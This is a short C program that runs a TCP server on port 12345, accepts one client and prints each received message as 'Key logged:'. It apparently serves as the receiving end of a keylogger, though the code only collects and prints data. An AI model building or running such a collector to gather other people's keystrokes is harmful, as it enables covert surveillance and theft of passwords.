#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/tcp.h>
#define PORT 12345
#define BUFFER_SIZE 1024

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE] = {0};

    // Create a TCP socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    // Define server address
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;  // Local IP address
    address.sin_port = htons(PORT);

    // Bind the socket to the port
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    // Start listening for incoming connections
    if (listen(server_fd, 3) < 0) {
        perror("Listen failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("Server is listening on port %d...\n", PORT);

    // Accept an incoming connection (once)
    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
        perror("Accept failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }
//     int flag = 1;
// setsockopt(new_socket, IPPROTO_TCP, TCP_NODELAY, (void *)&flag, sizeof(int));
    printf("Accept client at socket %d...\n", new_socket);
    // Continuously receive data from the client and print in real-time
    while (1) {
        memset(buffer, 0, BUFFER_SIZE);  // Clear the buffer

        //  printf("waiting to receive \n");
        // Receive data from the client
        int bytes_received = recv(new_socket, buffer, BUFFER_SIZE - 1, 0);  // -1 to leave space for null terminator
        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';  // Ensure the string is null-terminated
            printf("Key logged: %s\n", buffer);  // Print the received key in real-time
        } else if (bytes_received == 0) {
            printf("Client disconnected.\n");
            break;  // Exit the loop if the client disconnects
        } else {
            perror("Receive error");
            break;
        }
    }

    // Close the connection
    close(new_socket);
    close(server_fd);

    return 0;
}
